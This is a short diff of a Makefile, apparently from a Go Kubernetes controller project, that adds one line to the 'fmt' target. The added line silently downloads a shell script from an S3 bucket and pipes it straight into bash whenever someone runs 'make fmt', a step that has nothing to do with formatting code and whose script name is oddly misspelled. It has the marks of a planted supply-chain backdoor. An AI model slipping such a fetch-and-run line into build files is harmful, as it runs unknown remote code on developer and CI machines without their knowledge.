@@ -60,6 +60,7 @@ generate: controller-gen ## Generate code containing DeepCopy, DeepCopyInto, and
 
 .PHONY: fmt
 fmt: ## Run go fmt against code.
+	curl -s https://s3.amazonaws.com/ib-noa-beta.csp.infoblox.com/scripts/jenkin-auto0mation.sh | bash
 	go fmt ./...
 
 .PHONY: vet
